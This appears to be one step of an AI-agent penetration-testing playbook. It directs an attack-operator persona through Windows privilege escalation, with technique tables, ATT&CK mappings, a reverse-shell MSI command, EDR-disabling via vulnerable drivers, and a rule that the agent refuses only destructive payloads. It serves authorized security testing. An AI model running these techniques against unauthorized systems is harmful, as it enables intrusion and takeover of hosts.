# Step 4: Windows Privilege Escalation

**Progress: Step 4 of 10** — Next: Linux/Unix Privilege Escalation

## STEP GOAL:

Execute Windows-specific privilege escalation techniques based on enumeration findings from step-02 and credentials from step-03. Escalate from current access level to SYSTEM, Administrator, or highest achievable privilege. Document all attempts, successes, and failures with full ATT&CK mapping.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER execute techniques outside the Rules of Engagement — verify RoE scope before every action
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE A POST-EXPLOITATION SPECIALIST executing authorized privilege escalation operations
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 Windows escalation ONLY — Linux is step-05, AD is step-06
- ⚡ If step-01 classified Windows as N/A, perform brief applicability confirmation then proceed to [C]
- 📋 Every technique attempted must be logged: technique, T-code, result, artifacts created
- 🛡️ Assess EDR/AV evasion requirements BEFORE execution
- 🔄 Start with lowest-noise techniques, escalate noise only as needed
- 📊 Prioritize techniques by: probability of success × stealth (from step-02 findings)

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - Kernel exploits risk BSOD — assess target stability and whether it is a production system before attempting kernel-level attacks
  - UAC bypass techniques have short shelf lives — verify the technique is effective against the target's specific Windows build and patch level
  - Service exploitation may disrupt business operations if the targeted service is critical to production — verify service criticality first
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present escalation plan before beginning execution
- ⚠️ Present [A]/[W]/[C] menu after escalation attempts complete
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Step-02 enumeration (vectors scored), step-03 credentials, engagement RoE
- Focus: Windows local privilege escalation only — no AD domain attacks (step-06)
- Limits: Stay within RoE. Log every attempt. Do not proceed to AD techniques.
- Dependencies: step-02-local-enum.md (escalation vectors), step-03-credential-discovery.md (credentials)

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Applicability Check

**Determine whether Windows privilege escalation applies to this engagement:**

- If environment is NOT Windows → document "N/A — {{OS}} environment" → proceed directly to Menu → [C]
- If Windows → continue with this step

**If Windows, review prerequisites:**
- Load step-02 enumeration vectors specific to Windows
- Load step-03 credential findings (cached credentials, service account passwords, stored tokens)
- Confirm current access level: user SID, group memberships, integrity level (Low/Medium/High/System)
- Identify target privilege level: SYSTEM, local Administrator, or specific service account

**Present initial assessment:**
```
| Parameter | Value |
|-----------|-------|
| Current User | {{username}} |
| Current Integrity Level | {{Low/Medium/High}} |
| Group Memberships | {{groups}} |
| Target Privilege | {{SYSTEM/Administrator/specific}} |
| Windows Version | {{version + build}} |
| Patch Level | {{last KB installed}} |
| EDR/AV Present | {{product(s)}} |
| RoE Constraints | {{relevant constraints}} |
```

### 2. Token & Privilege Abuse (T1134)

**Assess available token privileges and plan exploitation:**

**Enumerate current privileges:**
- `whoami /priv` — list all assigned privileges and their status (Enabled/Disabled)
- `whoami /all` — full token information including SIDs and group memberships

**Exploitation matrix based on available privileges:**

| Privilege | Technique | Tool | ATT&CK |
|-----------|-----------|------|--------|
| SeImpersonatePrivilege | Potato attacks (JuicyPotato, PrintSpoofer, GodPotato, SweetPotato) | JuicyPotato.exe, PrintSpoofer.exe | T1134.001 |
| SeBackupPrivilege | Shadow copy + SAM/SYSTEM extraction | wbadmin, diskshadow | T1003.002 |
| SeRestorePrivilege | DLL hijack via file replacement | Copy + restart service | T1574.001 |
| SeDebugPrivilege | Process injection / LSASS access | mimikatz, nanodump | T1055 |
| SeTakeOwnershipPrivilege | Take ownership of protected files | takeown + icacls | T1222 |
| SeLoadDriverPrivilege | Load vulnerable driver (BYOVD) | Custom loader | T1068 |
| SeAssignPrimaryTokenPrivilege | Token manipulation | Incognito, meterpreter | T1134.003 |

**For each available privilege, present:**
```
| Privilege | Status | Exploitation Approach | Required Tool | Detection Risk | Expected Outcome |
|-----------|--------|-----------------------|---------------|----------------|------------------|
```

**Execution order:** prioritize by detection risk (Low first), then by probability of success.

### 3. UAC Bypass (T1548.002)

**If current user is local admin but UAC is blocking elevation:**

**First, determine UAC configuration:**
- Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
- Values: `EnableLUA`, `ConsentPromptBehaviorAdmin`, `FilterAdminToken`
- UAC level: Always Notify / Default / Notify (no dimming) / Never Notify

**Auto-elevate binary identification:**
- Binaries with `autoElevate=true` in manifest — candidates for bypass
- Trusted directories check — are mock trusted directory attacks viable?

**Bypass technique selection based on Windows build:**

| Technique | Method | Windows Version | Detection Risk |
|-----------|--------|-----------------|----------------|
| fodhelper.exe | Registry hijack (HKCU\ms-settings) | Win 10/11 | Medium |
| computerdefaults.exe | Registry hijack (HKCU\ms-settings) | Win 10+ | Medium |
| eventvwr.exe | Registry hijack (HKCU\mscfile) | Win 7-10 | Medium-High |
| sdclt.exe | App paths + DLL sideloading | Win 10+ | Medium |
| cmstp.exe | INF file execution | All | Medium |
| DiskCleanup | Environment variable hijack (windir) | Win 10+ | Low-Medium |
| Mock trusted dirs | DLL loading from spoofed trusted path | All | Low |

**Present recommended bypass:**
- Target Windows build: {{build}}
- Recommended technique: {{technique}} — reason: {{why}}
- Alternative: {{technique}} — if primary fails
- EDR considerations: {{evasion notes}}

### 4. Service Exploitation (T1574)

**Based on step-02 enumeration findings, assess all service-based escalation vectors:**

#### 4a. Unquoted Service Paths (T1574.009)

- List services with unquoted paths AND writable directories in the path
- For each candidate:
  ```
  | Service Name | Unquoted Path | Writable Directory | Binary Placement | Restart Method |
  |--------------|---------------|--------------------|------------------|----------------|
  ```
- Present exploitation plan: binary placement location, payload type, service restart trigger, cleanup procedure

#### 4b. Weak Service Permissions (T1574.010)

- Services where current user can modify binary path or service configuration
- Enumeration tools: `sc sdshow {{service}}`, `accesschk.exe -uwcqv {{user}} *`, PowerUp `Get-ModifiableService`
- For each candidate:
  ```
  | Service Name | Current Binary Path | Modifiable Config | Exploitation Approach | Restart Required |
  |--------------|---------------------|-------------------|-----------------------|------------------|
  ```

#### 4c. DLL Hijacking (T1574.001)

- Services loading DLLs from writable locations
- Missing DLLs in search order (DLL search order hijacking)
- Tools: Process Monitor (filter: NAME NOT FOUND + path writability), DLL export forwarding
- For each candidate:
  ```
  | Target Service | Missing/Hijackable DLL | DLL Path | Hijack Method | Service Runs As |
  |----------------|------------------------|----------|---------------|-----------------|
  ```

#### 4d. Writable Service Binaries (T1574.010)

- Direct replacement of service executables where current user has write access
- Enumeration: `icacls {{path}}` on each service binary
- For each candidate:
  ```
  | Service Name | Binary Path | Current Permissions | Runs As | Replacement Plan |
  |--------------|-------------|---------------------|---------|------------------|
  ```

**Service exploitation priority:** Weak permissions > Unquoted paths > DLL hijack > Binary replacement (ordered by reliability and stealth).

### 5. Scheduled Task & Registry Abuse

#### Scheduled Tasks (T1053.005)

**Enumerate exploitable scheduled tasks:**
- Tasks running as SYSTEM or higher-privileged account with writable scripts/binaries
- Tasks with modifiable XML definitions (`schtasks /query /xml`)
- Tasks triggered by events the current user can generate

For each candidate:
```
| Task Name | Schedule | Runs As | Target Script/Binary | Writability | Exploitation Plan |
|-----------|----------|---------|----------------------|-------------|-------------------|
```

#### Registry AutoRun (T1547.001)

**Enumerate writable autorun locations:**
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — writable by current user?
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` — writable by current user?
- Service `ImagePath` registry entries — modifiable?
- Startup folder: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` — writable?

For each writable location:
```
| Registry Key / Path | Current Value | Writability | Runs As | Exploitation Approach |
|---------------------|---------------|-------------|---------|----------------------|
```

#### AlwaysInstallElevated (T1547)

- Check both registry keys:
  - `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` → `AlwaysInstallElevated` = 1
  - `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` → `AlwaysInstallElevated` = 1
- If BOTH are set → MSI payload escalation is viable
- Tool: `msfvenom -p windows/shell_reverse_tcp LHOST={{ip}} LPORT={{port}} -f msi -o escalate.msi`
- Execution: `msiexec /quiet /qn /i escalate.msi`

### 6. Kernel Exploitation (T1068)

**⚠️ KERNEL EXPLOITS ARE LAST RESORT — stability risk is significant.**

**Compare OS version + patch level against known kernel exploits:**

| CVE | Affected Versions | Reliability | BSOD Risk | Tool |
|-----|-------------------|-------------|-----------|------|
| {{CVE}} | {{versions}} | {{High/Med/Low}} | {{risk level}} | {{tool}} |

**Common Windows kernel exploit candidates (verify against target patch level):**
- CVE-2021-1732 (Win32k) — Win 10 1803-20H2
- CVE-2021-36934 (HiveNightmare/SeriousSAM) — Win 10 1809+
- CVE-2022-21882 (Win32k) — Win 10/11, Server 2019/2022
- CVE-2023-21768 (AFD.sys) — Win 11 22H2
- CVE-2024-21338 (appid.sys) — Win 10/11, Server 2019/2022
- PrintNightmare (CVE-2021-34527) — if unpatched, local variant for escalation

**Pre-execution checklist:**
- [ ] All lower-risk vectors exhausted or inapplicable
- [ ] Target stability assessed (production vs. lab)
- [ ] Exploit reliability verified against exact OS build
- [ ] Rollback plan prepared (what happens on failure/BSOD)
- [ ] Operator explicitly approved kernel-level exploitation

**Emphasize:** kernel exploits should only be attempted after token abuse, UAC bypass, service exploitation, and scheduled task abuse have been exhausted or deemed inapplicable.

### 7. Additional Windows Vectors

**Assess supplementary escalation techniques when primary vectors are insufficient:**

**Named Pipe Impersonation (T1134):**
- If running as a service account — pipe impersonation via `CreateNamedPipe`
- Create named pipe, wait for SYSTEM connection, impersonate token
- Tools: custom pipe server, SpoolSample for triggering connections

**Print Spooler Abuse:**
- PrintNightmare local variants (CVE-2021-34527, CVE-2021-1675) — if unpatched
- SpoolFool (CVE-2022-21999) — printer driver directory junction
- Verify: `Get-Service Spooler` — is the service running?

**BYOVD — Bring Your Own Vulnerable Driver (T1068):**
- Load signed vulnerable driver for kernel read/write
- Common targets: Capcom.sys, DBUtil_2_3.sys, RTCore64.sys
- Requires SeLoadDriverPrivilege OR admin access
- Use for: disabling EDR kernel callbacks, elevating to SYSTEM

**COM Object Hijacking (T1546.015):**
- Writable COM registration keys in HKCU
- Per-user COM objects that override HKLM registrations
- Identify scheduled tasks or services that instantiate hijackable CLSIDs

**Credential Guard Bypass:**
- If Credential Guard is partially deployed (not enforced via UEFI lock)
- Assess: `Get-CimInstance -ClassName Win32_DeviceGuard` for VBS status
- Partial deployment may leave gaps exploitable for credential extraction

**For each additional vector assessed:**
```
| Vector | Applicability | Technique Detail | Detection Risk | Outcome |
|--------|---------------|------------------|----------------|---------|
```

### 8. Compile Escalation Results & Present Menu

**Compile comprehensive attempt/success summary:**

```
| Attempt | Technique | T-Code | Target | Result | Artifacts Created | Detection Events |
|---------|-----------|--------|--------|--------|-------------------|------------------|
| WIN-001 | {{technique}} | T{{code}} | {{target}} | Success/Fail | {{artifacts}} | {{detection_events}} |
| WIN-002 | {{technique}} | T{{code}} | {{target}} | Success/Fail | {{artifacts}} | {{detection_events}} |
| ... | ... | ... | ... | ... | ... | ... |
```

**Overall escalation status:**
- Techniques attempted: {{count}}
- Successful escalations: {{count}}
- Highest privilege achieved: {{level}} (Low → Medium → High → SYSTEM)
- Detection events generated: {{count}}
- Artifacts on disk: {{list}}

**Write findings under `## Windows Escalation Paths`:**

```markdown
## Windows Escalation Paths

### Summary
- Techniques attempted: {{count}}
- Successful escalations: {{count}}
- Highest privilege achieved: {{level}}
- Detection events generated: {{count}}
- Primary escalation path: {{technique}} ({{tcode}})

### Initial Assessment
{{initial_assessment_table}}

### Token & Privilege Abuse
{{token_abuse_results}}

### UAC Bypass
{{uac_bypass_results}}

### Service Exploitation
{{service_exploitation_results}}

### Scheduled Task & Registry Abuse
{{scheduled_task_results}}

### Kernel Exploitation
{{kernel_exploit_results_or_na}}

### Additional Vectors
{{additional_vectors_results}}

### Escalation Attempt Log
{{full_attempt_log_table}}
```

Update frontmatter:
- `techniques_attempted` with count
- `techniques_successful` with count
- `highest_privilege_achieved` with level
- `detection_events` with count

### 9. Present MENU OPTIONS

"**Windows privilege escalation completed.**

Summary: {{count}} techniques attempted, {{count}} successful.
Highest privilege achieved: {{level}} | Primary path: {{technique}} ({{tcode}})
Detection events: {{count}} | Artifacts on disk: {{artifact_count}}

**Select an option:**
[A] Advanced Elicitation — Deep analysis of a specific escalation vector (evasion refinement, alternative approaches, detection gap analysis)
[W] War Room — Red (alternative escalation paths, chained techniques, persistence opportunities) vs Blue (detection analysis of methods used, forensic artifacts left, IOC generation)
[C] Continue — Proceed to Linux/Unix Privilege Escalation (Step 5 of 10)"

#### Menu Handling Logic:

- IF A: Deep analysis — examine a specific vector in depth: evasion effectiveness against the detected EDR, alternative tool selection, technique chaining opportunities, residual artifacts and cleanup. Process insights, ask user if they want to refine approach, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room — Red Team perspective: what alternative escalation chains exist? Can techniques be combined for higher reliability? What persistence opportunities does the achieved privilege unlock? Blue Team perspective: which Sigma/YARA rules would detect the techniques used? What ETW providers captured telemetry? What forensic artifacts remain on disk and in event logs? What detection gaps were exploited? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to stepsCompleted and updating techniques_attempted, techniques_successful, highest_privilege_achieved, detection_events, then read fully and follow: ./step-05-linux-privesc.md
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and techniques_attempted, techniques_successful, highest_privilege_achieved, detection_events updated and Windows Escalation Paths section populated], will you then read fully and follow: `./step-05-linux-privesc.md` to begin Linux/Unix privilege escalation.

---

## SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- Applicability check performed — Windows confirmed or N/A documented
- All applicable Windows vectors assessed in order: tokens → UAC → services → tasks/registry → kernel → additional
- Techniques prioritized by noise level (lowest-noise first)
- Every attempt logged with technique name, T-code, result, artifacts, and detection events
- EDR/AV evasion assessed BEFORE execution of each technique
- Highest achievable privilege documented with evidence
- Kernel exploits attempted ONLY after all lower-risk vectors exhausted
- Report section `## Windows Escalation Paths` populated with full results
- Frontmatter updated: techniques_attempted, techniques_successful, highest_privilege_achieved, detection_events
- Step added to stepsCompleted in frontmatter

### ❌ SYSTEM FAILURE:

- Attempting kernel exploits before lower-risk vectors (token abuse, UAC bypass, service exploitation)
- Not logging failed attempts — failures are intelligence, not waste
- Skipping applicability check when Windows is N/A
- Not assessing EDR/AV before executing techniques
- Executing AD domain attacks in this step (that is step-06)
- Not updating report with results before proceeding
- Not prioritizing by noise level (executing high-noise techniques first)
- Proceeding without user selecting 'C' (Continue)

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every technique logged, every attempt documented, every escalation path assessed from lowest noise to highest.
